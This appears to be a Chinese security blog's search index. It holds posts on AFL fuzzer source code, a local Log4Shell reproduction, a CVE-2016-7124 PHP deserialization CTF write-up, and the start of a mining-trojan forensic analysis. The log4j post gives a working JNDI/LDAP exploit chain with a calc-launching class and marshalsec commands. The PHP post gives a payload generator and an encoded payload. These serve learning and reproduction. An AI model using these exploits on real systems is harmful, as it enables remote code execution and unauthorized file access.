<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AFL_FUZZ_Code_Learning</title>
    <url>/2022/03/21/AFL-FUZZ-Code-Learning/</url>
    <content><![CDATA[<h1 id="AFL-Fuzz-Souce-Code-Learning"><a href="#AFL-Fuzz-Souce-Code-Learning" class="headerlink" title="AFL Fuzz Souce Code Learning"></a>AFL Fuzz Souce Code Learning</h1><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>main的核心就两个函数，find_as和edit_params，从他们的名字可以大致推断find_as应该是用来找as文件或者目录的，edit_params应该是用来修改gcc的参数，加上一些宏定义啥的，在原有的基础上添加一些参数设置。最后通过execvp来执行前面编辑好（加了额外afl所需要的参数）的gcc命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="keyword">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><p>find_as首先会传入afl-gcc的路径，然后通过getenv函数看是否存在AFL_PATH路径，如果存在则看afl_path/as路径是否可以访问，可以访问这个函数就直接返回了。如果之前getenv判断不存在AFL_PATH，则afl_path为null</p>
<p><img src="https://s2.loli.net/2022/03/20/5I6LwasZz2elvE1.png" alt="image-20220320213615018"></p>
<p>slash为afl_gcc的路径，通过strrchr取出/afl-gcc，dir根据slash知道了afl-gcc所在的目录从而判断出afl-as的目录，它猜测跟afl-gcc是同一个目录，所以之后加上了afl-gcc的父目录，这样来定位afl-as所在的路径，定位了afl-as的路径后赋值给tmp</p>
<p><img src="https://s2.loli.net/2022/03/20/NxSoEyFPdu4skjv.png" alt="image-20220320214737631"></p>
<p>再判断tmp（也就是afl-as）是否可以访问，可以访问<strong>find_as</strong>此函数就结束了</p>
<p><img src="https://s2.loli.net/2022/03/20/G2qWZ7Cu4o9INmX.png" alt="image-20220320215513179"></p>
<h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>首先为cc_params分配argc*8字节的内存空间，再看argv[0]是否包含’/‘，反正就是取出/之后的字符串，再看是不是afl-clang或者afl-clang++，如果两个都不是判断是不是afl_g++还是afl_gcc</p>
<p><img src="https://s2.loli.net/2022/03/20/d3X4a6KeJrHZjV2.png" alt="image-20220320220834677"></p>
<p>这里是afl_gcc，最后取环境变量AFL_CC的值，如果存在就把cc_params[0]设置为该值，如果不存在就设置为gcc</p>
<p><img src="https://s2.loli.net/2022/03/20/d2KNlPbq1z7X93T.png" alt="image-20220320221912533"></p>
<p>之后从argv[1]遍历argv参数，遇到-B、-integrated-as、-pipe参数就跳过，遇到-fsanitize=address或者-fsanitize=memory就设置aasan_set 为 1，遇到字符串包含了FORTIFY_SOURCE就把fortify_set参数设为1</p>
<p><img src="https://s2.loli.net/2022/03/20/1SwEfPvzMBlKRVj.png" alt="image-20220320225556935"></p>
<p>取出之前计算出来的as_path的路径，然后参数相当于-B as_path，这里as_path = 目录/AFL，再判断clang_mode和AFL_HARDEN是否开启，如果有就再加上对应的参数,-no-integrated-as、-fstack-protector-all</p>
<p><img src="https://s2.loli.net/2022/03/20/5nrKCwslbEaUJ1T.png" alt="image-20220320230414127"></p>
<p>再判断asan_set，开启的话就让AFL_USE_ASAN设置为1，如果存在AFL_USE_NASN，就添加参数-U_FORTIFY_SOURCE、-fsanitize=address，但是这两句语句执行之前说明了AFL_USE_ASAN和AFL_USE_MASN只能选一个，不能同时。区别在于前者-fsanitize=address，后者AFL_USE_MASN的-fsanitize=memory</p>
<p><img src="https://s2.loli.net/2022/03/20/UlSCgnFqKMPDt3p.png" alt="image-20220320230937239"></p>
<p>如果AFL_DONT_OPTIMIZE环境变量为空，则添加参数-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</p>
<p><img src="https://s2.loli.net/2022/03/20/sTMOfrLUWSqy3uQ.png" alt="image-20220320232250996"></p>
<p>如果存在AFL_NO_BUILTIN环境变量，则添加-fno-builtin-strcmp、-fno-builtin-strncmp、-fno-builtin-strcasecmp、-fno-builtin-strncasecmp、-fno-builtin-memcmp、-fno-builtin-strstr、-fno-builtin-strcasestr参数，最后cc_params的结尾为空，结束参数的编辑</p>
<p><img src="https://s2.loli.net/2022/03/20/vZ58twK6HNOj21V.png" alt="image-20220320232501229"></p>
<h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><h3 id="add-instrumentation（插桩关键代码）"><a href="#add-instrumentation（插桩关键代码）" class="headerlink" title="add_instrumentation（插桩关键代码）"></a>add_instrumentation（插桩关键代码）</h3><p>inf为要插桩程序汇编内容，while循环里按行读取text段设置instr_ok为1，说明现在开始是可插桩的，但是未必每行都需要插桩，比如遇到jmp，直接对此位置插桩一个随机数，遇到LBB或者L+数字的代表一个代码块，或者直接一个函数，于是将instrument_next设为1，跳到while循环下将此时的代码块插入一个随机数再将instrument_next设为0说明这段插完了不需要再插桩了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line">    if(instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#x27;\t&#x27; &amp;&amp; isalpha(line[1]))&#123;</span><br><span class="line">        fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                    R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        instrument_next = 0;</span><br><span class="line">        ins_lines++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    if (line[0] == &#x27;\t&#x27; &amp;&amp; line[1] == &#x27;.&#x27;) &#123;</span><br><span class="line">        if (!strncmp(line + 2, &quot;text\n&quot;, 5) ||</span><br><span class="line">            !strncmp(line + 2, &quot;section\t.text&quot;, 13) ||</span><br><span class="line">            !strncmp(line + 2, &quot;section\t__TEXT,__text&quot;, 21) ||</span><br><span class="line">            !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) &#123;</span><br><span class="line">            instr_ok = 1;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!strncmp(line + 2, &quot;section\t&quot;, 8) ||</span><br><span class="line">            !strncmp(line + 2, &quot;section &quot;, 8) ||</span><br><span class="line">            !strncmp(line + 2, &quot;bss\n&quot;, 4) ||</span><br><span class="line">            !strncmp(line + 2, &quot;data\n&quot;, 5)) &#123;</span><br><span class="line">            instr_ok = 0;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    if (line[0] == &#x27;\t&#x27;) &#123;</span><br><span class="line">            if (line[1] == &#x27;j&#x27; &amp;&amp; line[2] != &#x27;m&#x27; &amp;&amp; R(100) &lt; inst_ratio) &#123;</span><br><span class="line">                fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                        R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">                ins_lines++;</span><br><span class="line">            &#125;</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    if (strstr(line, &quot;:&quot;)) &#123;</span><br><span class="line">        if (line[0] == &#x27;.&#x27;) &#123;</span><br><span class="line">            if ((isdigit(line[2]) || (clang_mode &amp;&amp; !strncmp(line + 1, &quot;LBB&quot;, 3)))</span><br><span class="line">                        &amp;&amp; R(100) &lt; inst_ratio) &#123;</span><br><span class="line">                            instrument_next = 1;</span><br><span class="line">                        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            /* Function label (always instrumented, deferred mode). */</span><br><span class="line">            instrument_next = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">.LFB2:</span><br><span class="line">	.cfi_startproc</span><br><span class="line">	endbr64</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	.cfi_offset 6, -16</span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register 6</span><br><span class="line">	subq	$32, %rsp</span><br><span class="line">	movl	%edi, -20(%rbp)</span><br><span class="line">	movq	%rsi, -32(%rbp)</span><br><span class="line">	movq	%fs:40, %rax</span><br><span class="line">	movq	%rax, -8(%rbp)</span><br><span class="line">	xorl	%eax, %eax</span><br><span class="line">	leaq	.LC2(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	call	puts@PLT</span><br><span class="line">	leaq	-12(%rbp), %rax</span><br><span class="line">	movq	%rax, %rsi</span><br><span class="line">	leaq	.LC3(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movl	$0, %eax</span><br><span class="line">	call	__isoc99_scanf@PLT</span><br><span class="line">	movl	-12(%rbp), %eax</span><br><span class="line">	cmpl	$1, %eax</span><br><span class="line">	jne	.L4</span><br><span class="line">	call	f1</span><br><span class="line">	jmp	.L5</span><br><span class="line">.L4:</span><br><span class="line">	movl	-12(%rbp), %eax</span><br><span class="line">	cmpl	$2, %eax</span><br><span class="line">	jne	.L6</span><br><span class="line">	call	f2</span><br><span class="line">	jmp	.L5</span><br><span class="line">.L6:</span><br><span class="line">	leaq	.LC4(%rip), %rax</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	call	puts@PLT</span><br><span class="line">.L5:</span><br><span class="line">	movl	$0, %eax</span><br><span class="line">	movq	-8(%rbp), %rdx</span><br><span class="line">	subq	%fs:40, %rdx</span><br><span class="line">	je	.L8</span><br><span class="line">	call	__stack_chk_fail@PLT</span><br><span class="line">.L8:</span><br><span class="line">	leave</span><br><span class="line">	.cfi_def_cfa 7, 8</span><br><span class="line">	ret</span><br><span class="line">	.cfi_endproc</span><br></pre></td></tr></table></figure>

<h2 id="未完待续！"><a href="#未完待续！" class="headerlink" title="未完待续！"></a>未完待续！</h2><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p>
]]></content>
      <tags>
        <tag>AFL</tag>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-log4j漏洞复现</title>
    <url>/2021/12/10/Apache-log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="apache-log4j本地漏洞复现"><a href="#apache-log4j本地漏洞复现" class="headerlink" title="apache-log4j本地漏洞复现"></a>apache-log4j本地漏洞复现</h1><p><a href="Apache-log4j-poc.zip">POC下载</a></p>
<p>exp（弹出一个计算器）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Main.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要向pom.xml中导入以下配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://search.maven.org/ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>把exp的java源码用<code>javac exp.java</code>生成exp.class，记得最好单独放到一个文件夹里，在到这个文件夹下，用python2开个http服务<code>python -m http.server 8899</code>，如下说明成功</p>
<p><img src="https://s2.loli.net/2021/12/10/d8AcUODlQP2RKxF.png" alt="image-20211210163035219"></p>
<p>复现之前，需要下载一个插件</p>
<p><code>git clone git@github.com:mbechler/marshalsec.git</code></p>
<p>用idea打开此项目，使用Maven生成jar包</p>
<p>先clean，然后package（中途可能会报错）</p>
<p><img src="https://s2.loli.net/2021/12/10/6wPGI5TUkXgipn3.png" alt="image-20211210163227931"></p>
<p>然后单独用命令<code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8899/#exp&quot;</code></p>
<p><img src="https://s2.loli.net/2021/12/10/yALQ5SOj2mrpEqG.png" alt="image-20211210163848110"></p>
<p>运行后显示1389为监听端口，这也是为什么我的main函数中的端口为1389</p>
<p>这样就成功了</p>
<p><img src="https://s2.loli.net/2021/12/10/p45r2MFinb6OW8d.png" alt="image-20211210164000550"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-7124</title>
    <url>/2021/06/09/CVE-2016-7124(php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/</url>
    <content><![CDATA[<h1 id="CVE-2016-7124漏洞复现—php反序列化漏洞"><a href="#CVE-2016-7124漏洞复现—php反序列化漏洞" class="headerlink" title="CVE-2016-7124漏洞复现—php反序列化漏洞"></a>CVE-2016-7124漏洞复现—php反序列化漏洞</h1><p><strong>参考攻防世界web方向Web_php_unserialize题目</strong></p>
<p>主要原因：如果存在__wakeup()函数，掉用**unserialize()**方法前会先调用wakeup方法，但如果序列化中表示属性个数的个数大于真实属性个数会跳过wakeup的执行，从而可以恶意构造字符串，反序列化成想要执行的函数</p>
<h2 id="打开题目网页php代码如下"><a href="#打开题目网页php代码如下" class="headerlink" title="打开题目网页php代码如下"></a>打开题目网页php代码如下</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="1、需要绕过wake-up函数"><a href="#1、需要绕过wake-up函数" class="headerlink" title="1、需要绕过wake up函数"></a>1、需要绕过wake up函数</h3><p>虽然function __wakeup函数想要把你强制成index.php，但是我们依然有绕过方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>**__wakeup()**：是在反序列化操作中起作用的魔法函数，当unserialize的时候，会检查是否存在__wakeup()函数，如果存在的话，会优先调用__wakeup()函数。</p>
<p><strong>绕过方法：</strong>__wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么i就调用__wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<p>知道它的机制后我们到时候改下序列化后的字符串中的那个属性个数就ok了,此类中只有$file这一个属性和三个function而已，个数应该为1</p>
<h3 id="2、绕过正则表达式"><a href="#2、绕过正则表达式" class="headerlink" title="2、绕过正则表达式"></a>2、绕过正则表达式</h3><p>(preg_match(’/[oc]:\d+:/i’, $var))<br>而正则匹配的规则是: 在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤 .很明显 ， 因为 serialize() 的参数为 object ，因此参数类型肯定为对象 “ O “ ， 又因为序列化字符串的格式为 参数格式:参数名长度 ， 因此 “ O:4 “ 这样的字符串肯定无法通过正则匹配<br>绕过方法：而O:+4没被过滤说明绕过了过滤而且最后的值不变。</p>
<h3 id="3、必须是base64加密"><a href="#3、必须是base64加密" class="headerlink" title="3、必须是base64加密"></a>3、必须是base64加密</h3><p>把上述绕过处理的字符串base64加密就行了</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>先把反序列化后的代码想清楚，其实就是$a = new Demo(“f14g.php”)，那么它序列化后长这样：</p>
<p><strong>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</strong></p>
<p>由上面分析可知有三个地方阻挡了咋们，按照上述分析，我们把”Demo”后面的1换成2，1是因为属性就$file一个，改变个数就可以绕过__wakeup()函数啦，这样咋们想访问的fl4g.php就能生效了</p>
<p>再把O:4换成O:+4这样绕过正则表达式</p>
<p>最后把我们处理的字符串进行base64加密</p>
<p>测试poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; 		</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);		<span class="comment">//因为说了是f14g.php文件</span></span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$a</span>);		</span><br><span class="line"><span class="variable">$payload</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$payload</span>);	<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="variable">$payload</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$payload</span>);	<span class="comment">//绕过正则表达式</span></span><br><span class="line">var_dump(<span class="variable">$payload</span>);</span><br><span class="line">var_dump(base64_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code>就是咋们要传入的参数啦</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwn3e9za9wj31u605o3zj.jpg" alt="image-20210609174411533"></p>
<p>反序列化执行获取flag=”ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}”</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwn3e9bplsj31hm06sdgu.jpg" alt="image-20210609174504066"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>DDos、挖矿木马的逆向分析实战</title>
    <url>/2022/01/07/DDos%E3%80%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="挂载感染硬盘"><a href="#挂载感染硬盘" class="headerlink" title="挂载感染硬盘"></a>挂载感染硬盘</h2><p>在linux系统中挂载img镜像文件，我们需要挂载这个img文件</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/9ixoQdrknAD12Kb.png" alt="image-20211222150040845"></p>
<p>首先通过命令<code>fdisk 192.168.10.1-2021-11-29.img</code>然后<code>p</code>命令查看磁盘的分区情况，units为512bytes/sectors，然后根据下面device中start开始的2048，去计算offset，offset = 512 * 2048 = 1048576</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/DZjbE9k7BsOV4YH.png" alt="image-20211226174734936"></p>
<p>然后挂载分区，命令<code> mount -o loop,offset=1048576 192.168.10.1-2021-11-29.img /mnt/</code>，然后进入/mnt目录下就可以看了。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/gd6ZXeKWUwEGYQp.png" alt="image-20211226174805477"></p>
<h2 id="linux敏感目录tmp分析"><a href="#linux敏感目录tmp分析" class="headerlink" title="linux敏感目录tmp分析"></a>linux敏感目录tmp分析</h2><p>可疑文件夹分别是Oct 17之后的这8个</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/tMDnHUdmsh6zqw7.png" alt="image-20211226174909213"></p>
<p>用clamscan分别对这8个文件夹进行扫描，并没有发现任何感染的文件</p>
<p><img src="https://re1own.github.io/assets/img/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/qHO6teLE4BsUgW9.png" alt="image-20211226175209909"></p>
<p>开机自启动排查</p>
<p>查看开机自启动程序，发现selinux和DbSecuritySpt在开机自启动中</p>
